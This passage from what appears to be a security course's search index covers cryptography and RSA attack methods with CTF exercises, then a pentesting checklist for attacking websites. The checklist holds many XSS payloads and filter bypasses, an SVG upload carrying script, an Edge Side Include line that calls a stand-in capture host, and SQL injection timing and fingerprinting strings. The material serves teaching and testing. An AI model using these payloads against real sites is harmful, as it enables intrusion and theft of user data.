on a computer, since it\u2019s hard to get the passwords from hashes. If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password. Two different files on the same hard drive with the same cryptographic hash can be very interesting. \u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d said Peter Selinger of Dalhousie University . \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d For example, he cited this famous pair: and Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4. Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d Ben Laurie has a nice website that visualizes this MD5 collision . For a non-technical, though slightly outdated, introduction to hash functions, see Steve Friedl\u2019s Illustrated Guide . And here\u2019s a good article from DFI News that explores the same topic. RSA RSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as Public Key Cryptography where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data. Definitions The Public Key is made up of ( n , e ) The Private Key is made up of ( n , d ) The message is represented as m and is converted into a number The encrypted message or ciphertext is represented by c p and q are prime numbers which make up n e is the public exponent n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA) d is the private exponent The totient \u03bb( n ) is used to compute d and is equal to the lcm( p -1, q -1), another definition for \u03bb( n ) is that \u03bb( pq ) = lcm(\u03bb( p ), \u03bb( q )) What makes RSA viable? If public n , public e , private d are all very large numbers and a message m holds true for 0 < m < n , then we can say: ( m e ) d \u2261 m (mod n ) The triple equals sign in this case refers to modular congruence which in this case means that there exists an integer k such that (m e)d = kn + m RSA is viable because it is incredibly hard to find d even with m , n , and e because factoring large numbers is an arduous process. Implementation RSA follows 4 steps to be implemented: 1. Key Generation 2. Encryption 3. Decryption Key Generation We are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand. In This example we are using Carmichael's totient function where \u03bb(n) = lcm(\u03bb(p), \u03bb(q)), but Euler's totient function is perfectly valid to use with RSA. Euler's totient is \u03c6(n) = (p \u2212 1)(q \u2212 1) Choose two prime numbers such as: p = 61 and q = 53 Find n = pq = 3233 Calculate \u03bb( n ) = lcm( p -1, q -1) \u03bb(3233) = lcm(60, 52) = 780 Choose a public exponent such that 1 < e < \u03bb( n ) and is coprime (not a factor of) \u03bb( n ). The standard is most cases is 65537, but we will be using: e = 17 Calculate d as the modular multiplicative inverse or in english find d such that: d x e mod \u03bb(n) = 1 d x 17 mod 780 = 1 d = 413 Now we have a public key of (3233, 17) and a private key of (3233, 413) Encryption With the public key, m can be encrypted trivially The ciphertext is equal to m e mod n or: c = m ^17 mod 3233 Decryption With the private key, m can be decrypted trivially as well The plaintext is equal to c d mod n or: m = c ^413 mod 3233 Exploitation From the RsaCtfTool README Attacks: Weak public key factorization Wiener's attack Hastad's attack (Small public exponent attack) Small q (q < 100,000) Common factor between ciphertext and modulus attack Fermat's factorisation for close p and q Gimmicky Primes method Past CTF Primes method Self-Initializing Quadratic Sieve (SIQS) using Yafu Common factor attacks across multiple keys Small fractions method when p/q is close to a small fraction Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d < n0.292) Elliptic Curve Method Pollards p-1 for relatively smooth numbers Mersenne primes factorization Exercise (4 pt) Pseudo Random Primes A wiser once said: \"every number can be factored to the sum of primes.\" Try to factor the number and find me some flag. Checkpoint: what's the first 20 numbers in f(pow(10,6))? Find those numbers and gain 2 points. Hint: try to convert enc into the binary. main.py (4 pt) GCD Oracle Some oracle can get you LSB and help solve the challenge. Now break the number N with the GCD Oracle. Byte The number N has 8 bits at most. Oracle can give you 10 times of response and then you should give the value of N. Solving this gives you the checkpoint for 2 points. But you can directly solve the second question and get 4 points. nc ali.infury.org 10008 Full The number N has 512 bits at most. If you solve this, don't need to solve the previous question. Hint: you may need a script to solve the second question. nc ali.infury.org 10007 main.py (2 pt) RSA in the triangle A modern public key encryption requires a key pair of 512 bytes usually. Sometimes I just confused about the private key. Therefore, I designed a \"super secure\" method to find me a private key. Hint: find a faster way to calculate the triangle. main.py challenge.txt","title":"Week11 CRYPTO: Public Key Crypto Attacking"},{"location":"CS315/Week%2011/#week11-crypto-public-key-crypto-attacking","text":"Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.","title":"Week11 CRYPTO: Public Key Crypto Attacking"},{"location":"CS315/Week%2011/#what-is-cryptography-used-for","text":"Uses in every day software Securing web traffic (passwords, communication, etc.) Securing copyrighted software code Malicious uses Hiding malicious communication Hiding malicious code","title":"What is cryptography used for?"},{"location":"CS315/Week%2011/#topics","text":"XOR Cesear Cipher Substitution Cipher Vigenere Cipher Hashing Functions RSA","title":"Topics"},{"location":"CS315/Week%2011/#xor","text":"","title":"XOR"},{"location":"CS315/Week%2011/#data-representation","text":"Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them","title":"Data Representation"},{"location":"CS315/Week%2011/#xor-basics","text":"An XOR or eXclusive OR is a bitwise operation indicated by ^ and shown by the following truth table: A B A ^ B 0 0 0 0 1 1 1 0 1 1 1 0 So what XOR'ing bytes in the action 0xA0 ^ 0x2C translates to is: 1 0 1 0 0 0 0 0 0 0 1 0 1 1 0 0 1 0 0 0 1 1 0 0 0b10001100` is equivelent to `0x8C`, a cool property of XOR is that it is reversable meaning `0x8C ^ 0x2C = 0xA0` and `0x8C ^ 0xA0 = 0x2C","title":"XOR Basics"},{"location":"CS315/Week%2011/#what-does-this-have-to-do-with-ctf","text":"XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example: >>> data = 'CAPTURETHEFLAG' >>> key = 'A' >>> encrypted = ''.join([chr(ord(x) ^ ord(key)) for x in data]) >>> encrypted '\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06' >>> decrypted = ''.join([chr(ord(x) ^ ord(key)) for x in encrypted]) >>> decrypted 'CAPTURETHEFLAG' This can be extended using a multibyte key by iterating in parallel with the data.","title":"What does this have to do with CTF?"},{"location":"CS315/Week%2011/#exploiting-xor-encryption","text":"","title":"Exploiting XOR Encryption"},{"location":"CS315/Week%2011/#single-byte-xor-encryption","text":"Single Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try.","title":"Single Byte XOR Encryption"},{"location":"CS315/Week%2011/#multibyte-xor-encryption","text":"Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others.","title":"Multibyte XOR Encryption"},{"location":"CS315/Week%2011/#substitution-cipher","text":"A Substitution Cipher is system of encryption where different symobls substitute a normal alphabet.","title":"Substitution Cipher"},{"location":"CS315/Week%2011/#caesar-cipherrot-13","text":"The Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts. CAESAR` encoded with a shift of 8 is `KIMAIZ` so `ABCDEFGHIJKLMNOPQRSTUVWXYZ` becomes `IJKLMNOPQRSTUVWXYZABCDEFGH ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts.","title":"Caesar Cipher/ROT 13"},{"location":"CS315/Week%2011/#vigenere-cipher","text":"A Vigenere Cipher is an extended Caesar Cipher where a message is encrypted using various Caesar shifted alphabets. The following table can be used to encode a message:","title":"Vigenere Cipher"},{"location":"CS315/Week%2011/#encryption","text":"For example, encrypting the text SUPERSECRET with CODE would follow this process: CODE gets padded to the length of SUPERSECRET so the key becomes CODECODECOD For each letter in SUPERSECRET we use the table to get the Alphabet to use, in this instance row C and column S The ciphertext's first letter then becomes U We eventually get UISITGHGTSW","title":"Encryption"},{"location":"CS315/Week%2011/#decryption","text":"Go to the row of the key, in this case C Find the letter of the cipher text in this row, in this case U The column is the first letter of the decrypted ciphertext, so we get S After repeating this process we get back to SUPERSECRET","title":"Decryption"},{"location":"CS315/Week%2011/#hashing-functions","text":"Hashing functions are one way functions which theoretically provide a unique output for every input. MD5, SHA-1, and other hashes which were considered secure are now found to have collisions or two different pieces of data which produce the same supposed unique output.","title":"Hashing Functions"},{"location":"CS315/Week%2011/#string-hashing","text":"A string hash is a number or string generated using an algorithm that runs on text or data. The idea is that each hash should be unique to the text or data (although sometimes it isn\u2019t). For example, the hash for \u201cdog\u201d should be different from other hashes. You can use command line tools tools or online resources such as this one. Example: $ echo -n password | md5 5f4dcc3b5aa765d61d8327deb882cf99 Here, \u201cpassword\u201d is hashed with different hashing algorithms: SHA-1 : 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8 SHA-2 : 5E884898DA28047151D0E56F8DC6292773603D0D6AABBDD62A11EF721D1542D8 MD5 : 5F4DCC3B5AA765D61D8327DEB882CF99 CRC32 : BBEDA74F Generally, when verifying a hash visually, you can simply look at the first and last four characters of the string.","title":"String Hashing"},{"location":"CS315/Week%2011/#file-hashing","text":"A file hash is a number or string generated using an algorithm that is run on text or data. The premise is that it should be unique to the text or data. If the file or text changes in any way, the hash will change. What is it used for? - File and data identification - Password/certificate storage comparison How can we determine the hash of a file? You can use the md5sum command (or similar). $ md5sum samplefile.txt 3b85ec9ab2984b91070128be6aae25eb samplefile.txt","title":"File Hashing"},{"location":"CS315/Week%2011/#hash-collisions","text":"A collision is when two pieces of data or text have the same cryptographic hash. This is very rare. What\u2019s significant about collisions is that they can be used to crack password hashes. Passwords are usually stored as hashes on a computer, since it\u2019s hard to get the passwords from hashes. If you bruteforce by trying every possible piece of text or data, eventually you\u2019ll find something with the same hash. Enter it, and the computer accepts it as if you entered the actual password. Two different files on the same hard drive with the same cryptographic hash can be very interesting. \u201cIt\u2019s now well-known that the cryptographic hash function MD5 has been broken,\u201d said Peter Selinger of Dalhousie University . \u201cIn March 2005, Xiaoyun Wang and Hongbo Yu of Shandong University in China published an article in which they described an algorithm that can find two different sequences of 128 bytes with the same MD5 hash.\u201d For example, he cited this famous pair: and Each of these blocks has MD5 hash 79054025255fb1a26e4bc422aef54eb4. Selinger said that \u201cthe algorithm of Wang and Yu can be used to create files of arbitrary length that have identical MD5 hashes, and that differ only in 128 bytes somewhere in the middle of the file. Several people have used this technique to create pairs of interesting files with identical MD5 hashes.\u201d Ben Laurie has a nice website that visualizes this MD5 collision . For a non-technical, though slightly outdated, introduction to hash functions, see Steve Friedl\u2019s Illustrated Guide . And here\u2019s a good article from DFI News that explores the same topic.","title":"Hash Collisions"},{"location":"CS315/Week%2011/#rsa","text":"RSA, which is an abbreviation of the author's names (Rivest\u2013Shamir\u2013Adleman), is a cryptosystem which allows for asymmetric encryption. Asymmetric cryptosystems are alos commonly referred to as Public Key Cryptography where a public key is used to encrypt data and only a secret, private key can be used to decrypt the data.","title":"RSA"},{"location":"CS315/Week%2011/#definitions","text":"The Public Key is made up of ( n , e ) The Private Key is made up of ( n , d ) The message is represented as m and is converted into a number The encrypted message or ciphertext is represented by c p and q are prime numbers which make up n e is the public exponent n is the modulus and its length in bits is the bit length (i.e. 1024 bit RSA) d is the private exponent The totient \u03bb( n ) is used to compute d and is equal to the lcm( p -1, q -1), another definition for \u03bb( n ) is that \u03bb( pq ) = lcm(\u03bb( p ), \u03bb( q ))","title":"Definitions"},{"location":"CS315/Week%2011/#what-makes-rsa-viable","text":"If public n , public e , private d are all very large numbers and a message m holds true for 0 < m < n , then we can say: ( m e ) d \u2261 m (mod n ) The triple equals sign in this case refers to modular congruence which in this case means that there exists an integer k such that (m e)d = kn + m RSA is viable because it is incredibly hard to find d even with m , n , and e because factoring large numbers is an arduous process.","title":"What makes RSA viable?"},{"location":"CS315/Week%2011/#implementation","text":"RSA follows 4 steps to be implemented: 1. Key Generation 2. Encryption 3. Decryption","title":"Implementation"},{"location":"CS315/Week%2011/#key-generation","text":"We are going to follow along Wikipedia's small numbers example in order to make this idea a bit easier to understand. In This example we are using Carmichael's totient function where \u03bb(n) = lcm(\u03bb(p), \u03bb(q)), but Euler's totient function is perfectly valid to use with RSA. Euler's totient is \u03c6(n) = (p \u2212 1)(q \u2212 1) Choose two prime numbers such as: p = 61 and q = 53 Find n = pq = 3233 Calculate \u03bb( n ) = lcm( p -1, q -1) \u03bb(3233) = lcm(60, 52) = 780 Choose a public exponent such that 1 < e < \u03bb( n ) and is coprime (not a factor of) \u03bb( n ). The standard is most cases is 65537, but we will be using: e = 17 Calculate d as the modular multiplicative inverse or in english find d such that: d x e mod \u03bb(n) = 1 d x 17 mod 780 = 1 d = 413 Now we have a public key of (3233, 17) and a private key of (3233, 413)","title":"Key Generation"},{"location":"CS315/Week%2011/#encryption_1","text":"With the public key, m can be encrypted trivially The ciphertext is equal to m e mod n or: c = m ^17 mod 3233","title":"Encryption"},{"location":"CS315/Week%2011/#decryption_1","text":"With the private key, m can be decrypted trivially as well The plaintext is equal to c d mod n or: m = c ^413 mod 3233","title":"Decryption"},{"location":"CS315/Week%2011/#exploitation","text":"From the RsaCtfTool README Attacks: Weak public key factorization Wiener's attack Hastad's attack (Small public exponent attack) Small q (q < 100,000) Common factor between ciphertext and modulus attack Fermat's factorisation for close p and q Gimmicky Primes method Past CTF Primes method Self-Initializing Quadratic Sieve (SIQS) using Yafu Common factor attacks across multiple keys Small fractions method when p/q is close to a small fraction Boneh Durfee Method when the private exponent d is too small compared to the modulus (i.e d < n0.292) Elliptic Curve Method Pollards p-1 for relatively smooth numbers Mersenne primes factorization","title":"Exploitation"},{"location":"CS315/Week%2011/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%2011/#4-pt-pseudo-random-primes","text":"A wiser once said: \"every number can be factored to the sum of primes.\" Try to factor the number and find me some flag. Checkpoint: what's the first 20 numbers in f(pow(10,6))? Find those numbers and gain 2 points. Hint: try to convert enc into the binary. main.py","title":"(4 pt) Pseudo Random Primes"},{"location":"CS315/Week%2011/#4-pt-gcd-oracle","text":"Some oracle can get you LSB and help solve the challenge. Now break the number N with the GCD Oracle. Byte The number N has 8 bits at most. Oracle can give you 10 times of response and then you should give the value of N. Solving this gives you the checkpoint for 2 points. But you can directly solve the second question and get 4 points. nc ali.infury.org 10008 Full The number N has 512 bits at most. If you solve this, don't need to solve the previous question. Hint: you may need a script to solve the second question. nc ali.infury.org 10007 main.py","title":"(4 pt) GCD Oracle"},{"location":"CS315/Week%2011/#2-pt-rsa-in-the-triangle","text":"A modern public key encryption requires a key pair of 512 bytes usually. Sometimes I just confused about the private key. Therefore, I designed a \"super secure\" method to find me a private key. Hint: find a faster way to calculate the triangle. main.py challenge.txt","title":"(2 pt) RSA in the triangle"},{"location":"CS315/Week%2012/","text":"Week12 WEB: Attacking Websites In every pentest web there is several hidden and obvious places that might be vulnerable. This post is meant to be a checklist to confirm that you have searched vulnerabilities in all the possible places. Top 10 vulnerabilities https://owasp.org/www-project-top-ten/ Injection Broken Authentication and Session Management Sensitive Data Exposure XML External Entity Broken Access Control Security Misconfiguration Cross-Site Scripting Insecure deserialization Using Components With Known Vulnerabilities Insufficient Logging and Monitoring Proxies Nowadays web applications usually uses some kind of intermediary proxies, those may be (ab)used to exploit vulnerabilities. These vulnerabilities need a vulnerable proxy to be in place, but they usually also need some extra vulnerability in the backend. Abusing hop-by-hop headers Cache Poisoning/Cache Deception HTTP Request Smuggling H2C Smuggling Server Side Inclusion/Edge Side Inclusion Uncovering Cloudflare XSLT Server Side Injection User input Most of the web applications will allow users to input some data that will be processed later. Depending on the structure of the data the server is expecting some vulnerabilities may or may not apply. Reflected Values If the introduced data may somehow being reflected in the response, the page might be vulnerable to several issues. Client Side Template Injection Command Injection CRLF Dangling Markup File Inclusion/Path Traversal Open Redirect Prototype Pollution to XSS Server Side Inclusion/Edge Side Inclusion Server Side Request Forgery Server Side Template Injection Reverse Tab Nabbing XSLT Server Side Injection XSS XSSI XS-Search Some of the mentioned vulnerabilities requires special conditions, others just require the content to be reflected. You can find some interesting polygloths to test quickly the vulnerabilities in: Reflecting Techniques - PoCs and Polygloths CheatSheet XSS (Cross Site Scripting) Methodology Check if any value you control ( parameters , path , headers ?, cookies ?) is being reflected in the HTML or used by JS code. Find the context where it's reflected/used. If reflected Check which symbols can you use and depending on that, prepare the payload: In raw HTML : Can you create new HTML tags? Can you use events or attributes supporting javascript: protocol? Can you bypass protections? Is the HTML content being interpreted by any client side JS engine ( AngularJS , VueJS , Mavo ...), you could abuse a Client Side Template Injection . If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection ? Inside a HTML tag : Can you exit to raw HTML context? Can you create new events/attributes to execute JS code? Does the attribute where you are trapped support JS execution? Can you bypass protections? Inside JavaScript code : Can you escape the <script> tag? Can you escape the string and execute different JS code? Are your input in template literals ``? Can you bypass protections? If used : You could exploit a DOM XSS , pay attention how your input is controlled and if your controlled input is used by any sink. Reflected values In order to successfully exploit a XSS the first thing you need to find is a value controlled by you that is being reflected in the web page. Intermediately reflected : If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a Reflected XSS . Stored and reflected : If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a Stored XSS . Accessed via JS : If you find that a value controlled by you is being access using JS you could exploit a DOM XSS . Contexts When trying to exploit a XSS the first thing you need to know if where is your input being reflected . Depending on the context, you will be able to execute arbitrary JS code on different ways. Raw HTML If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible HTML tags you could use. Also, keep in mind Client Side Template Injection . Inside HTML tags attribute If your input is reflected inside the value of the attribute of a tag you could try: To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: \"><img [...] If you can escape from the attribute but not from the tag ( > is encoded or deleted), depending on the tag you could create an event that executes JS code: \" autofocus onfocus=alert(1) x=\" If you cannot escape from the attribute ( \" is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example , if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute href , where you can use the javascript: protocol to execute arbitrary code: href=\"javascript:alert(1)\" If your input is reflected inside \" unexpoitable tags \" you could try the accesskey trick to abuse the vuln (you will need some kind of social engineer to exploit this): \" accesskey=\"x\" onclick=\"alert(1)\" x=\" Inside JavaScript code In this case your input is reflected between <script> [...] </script> tags of a HTML page, inside a .js file or inside an attribute using javascript: protocol: If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected </script> tag is inside the HTML code. If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed: '-alert(1)-' ';-alert(1)// \\';alert(1)// If reflected inside template literals you can **embed JS expressions** using `${ ... }` syntax: var greetings =`Hello, ${alert(1)}``` DOM There is JS code that is using unsafely some data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code. https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/dom-xss.md Universal XSS These kind of XSS can be found anywhere . They not depend just on the client exploitation of a web application but on any context . These kind of arbitrary JavaScript execution can even be abuse to obtain RCE , read arbitrary files in clients and servers, and more. Some examples : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps.md Injecting inside raw HTML When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse < to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes . Only in the last case you will be able to exploit this case . For this cases also keep in mind Client Side Template Injection . Note: A HTML comment can be closed using --> or --!> In this case and if no black/whitelisting is used, you could use payloads like: <script>alert(1)</script> <img src=x onerror=alert(1) /> <svg onload=alert('XSS')> But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create. Once you have located which tags are allowed , you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context. Tags/Events brute-force Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy tags to clipboard . Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before). Custom tags If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with # to make the page focus on that object and execute the code: /?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x Blacklist Bypasses If some kind of blacklist is being used you could try to bypass it with some silly tricks: //Random capitalization <script> --> <ScrIpT> <img --> <ImG //Double tag, in case just the first match is removed <script><script> <scr<script>ipt> <SCRscriptIPT>alert(1)</SCRscriptIPT> //You can substitude the space to separate attributes for: / /*%00/ /%00*/ %2F %0D %0C %0A %09 //Unexpected parent tags <svg><x><script>alert('1'&#41</x> //Unexpected weird attributes <script x> <script a=\"1234\"> <script ~~~> <script/random>alert(1)</script> <script ///Note the newline >alert(1)</script> <scr\\x00ipt>alert(1)</scr\\x00ipt> //Not closing tag, ending with \" <\" or \" //\" <iframe SRC=\"javascript:alert('XSS');\" < <iframe SRC=\"javascript:alert('XSS');\" // //Extra open <<script>alert(\"XSS\");//<</script> //Just weird an unexpected, use your imagination <</script/script><script> <input type=image src onerror=\"prompt(1)\"> //Using `` instead of parenthesis onerror=alert`1` //Use more than one <<TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS=alert`1` // Length bypass (XSS in 20chars) Taken from the blog of Jorge Lajara . <svg/onload=alert``> <script src=//aa.es> <script src=//\u2121\u33db.pw> The last one is using 2 unicode characters which expands to 5: telsr More of these characters can be found here . To check in which characters are decomposed check here . More tiny XSS for different environments payload [can be found here and here . Click XSS - Clickjacking If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to abuse Clickjacking (if the page is vulnerable). Impossible - Dangling Markup If you just think that it's impossible to create an HTML tag with an attribute to execute JS code , you should check Danglig Markup because you could exploit the vulnerability without executing JS code. XSS Abusing other vulnerabilities XSS to SSRF Got XSS on a site that uses caching ? Try upgrading that to SSRF through Edge Side Include Injection with this payload: <esi:include src=\"http://yoursite.com/capture\" /> Use it to bypass cookie restrictions, XSS filters and much more! More information about this technique here: XSLT . XSS in dynamic created PDF If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code . So, if the PDF creator bot finds some kind of HTML tags , it is going to interpret them, and you can abuse this behaviour to cause a Server XSS . https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md If you cannot inject HTML tags it could be worth it to try to inject PDF data : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/pdf-injection.md XSS uploading files (svg) Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/): Content-Type: multipart/form-data; boundary=---------------------------232181429808 Content-Length: 574 -----------------------------232181429808 Content-Disposition: form-data; name=\"img\"; filename=\"img.svg\" Content-Type: image/svg+xml <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /> <script type=\"text/javascript\"> alert(1); </script> </svg> -----------------------------232181429808-- <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <script type=\"text/javascript\">alert(\"XSS\")</script> </svg> <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert(\"XSS\"); </script> </svg> XSS resources https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection http://www.xss-payloads.com https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt https://github.com/materaj/xss-list https://github.com/ismailtasdelen/xss-payload-list https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec https://netsec.expert/2020/02/01/xss-in-2020.html XSS TOOLS Find some tools for XSS here . Search functionalities If the functionality may be used to search some kind of data inside the backend, maybe you can (ab)use it to search arbitrary data. File Inclusion/Path Traversal NoSQL Injection LDAP Injection ReDoS SQL Injection XAPTH Injection SQL Injection What is SQL injection? SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database . It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users , or any other data that the application itself is able to access . In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. (From here ). In this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions. Entry point detection You may have found a site that is apparently vulnerable to SQL i just because the server is behaving weird with SQLi related inputs. Therefore, the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context. These are some useful examples: [Nothing] ' \" ` ') \") `) ')) \")) `)) Then, you need to know how to fix the query so there isn't errors . In order to fix the query you can input data so the previous query accept the new data , or you can just input your data and add a comment symbol add the end . Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy. Comments MySQL #comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL --comment /*comment*/ MSQL --comment /*comment*/ Oracle --comment SQLite --comment /*comment*/ HQL HQL does not support comments Confirming with logical operations One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection. Also you can apply this concept to mathematical operations . Example: If ?id=1 returns the same as ?id=2-1 , SQLinjection. page.asp?id=1 or 1=1 -- true page.asp?id=1' or 1=1 -- true page.asp?id=1\" or 1=1 -- true page.asp?id=1 and 1=2 -- false Confirming with Timing In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete: MySQL (string concat and logical ops) 1' + sleep(10) 1' and sleep(10) 1' && sleep(10) 1' | sleep(10) PostgreSQL (only support string concat) 1' || pg_sleep(10) MSQL 1' WAITFOR DELAY '0:0:10' Oracle 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) SQLite 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) In some cases the sleep functions won't be allowed . Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any) . Identifying Back-end The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones: [\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], Also, if you have access to the 